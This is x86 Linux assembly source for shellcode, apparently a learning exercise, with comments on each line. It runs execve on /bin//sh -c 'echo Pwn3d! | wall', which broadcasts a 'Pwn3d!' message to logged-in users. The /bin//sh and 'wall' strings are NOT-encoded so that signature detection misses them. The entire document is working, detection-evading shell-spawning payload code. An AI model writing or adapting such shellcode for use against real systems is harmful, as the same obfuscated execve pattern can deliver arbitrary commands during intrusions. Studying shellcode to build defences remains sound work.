global _start
section .text

_start:
push   0xb			; push 11 onto stack
pop    eax			 ; 11 is moved to eax reg , sys call number for execve 
cltd				; sign-extends eax into edx:eax.
push   edx			; push null on to stack
;objective is to push   0x6c6c6177 -->llaw onto stack, following changes is been done to achieve it
mov    esi, 0x93939e88		; mov 0x93939e88 to esi register
not esi				; not(0x93939e88) = 0x6c6c6177
mov dword [esp-4], esi		; the value 0x6c6c6177 is placed in [esp-4] location
sub esp, 4			; 4 is substracted from esp to point to top of the stack.
		
push   0x207c2021 ; push 0x207c2021 --> | !  onto the stack		
push   0x20206433;push 0x20206433 ---> d3 onto the stack
push   0x6e775020 ; push 0x6e775020 --> nwP onto the stack
push   0x6f686365 ; push 0x6f686365 ---> ohce onto the stack
mov    esi, esp   ; pointer to args is placed in esi reg
push   edx	  ; push null onto stack
push word 0x632d   	 ; push 0x632d --> c- onto stack
mov    ecx, esp   ; pointer to arg is moved to ecx reg
push   edx	  ; push null onto stack

; below objective is to push 0x68732f2f -->  hs// and 0x6e69622f --> nib/ onto stack,following manipulations has been done

mov ebx, 0x978CD0D0 ; move 0x978CD0D0 onto ebx reg
not ebx		  ; not(0x978CD0D0) = 0x68732f2f
mov dword [esp-4], ebx	; value 0x68732f2f --> hs// is placed in [esp-4]

mov ebx, 0x91969DD0 ; move 0x91969DD0  onto ebx register
not ebx		    ; not(0x91969DD0) = 0x6e69622f  --> nib/
mov dword [esp-8], ebx ; value 0x6e69622f placed in [esp-8]
sub esp, 8	   ; substract 8 from esp to point to top of the stack
mov   ebx, esp     ; pointer to arg is placed in ebx reg
push   edx	   ; push null to stack
push   esi         ;pointer to args which is placed in esi reg is pushed on to stack
push   ecx	   ;pointer to args which is placed in ecx reg is pushed on to stack
push   ebx	   ; pointer to args which is placed in ebx reg is pushed on to stack
xchg    ecx, esp   ; esp pointing at top of the stack is placed in ecx reg
int    0x80        ; sys call invoked
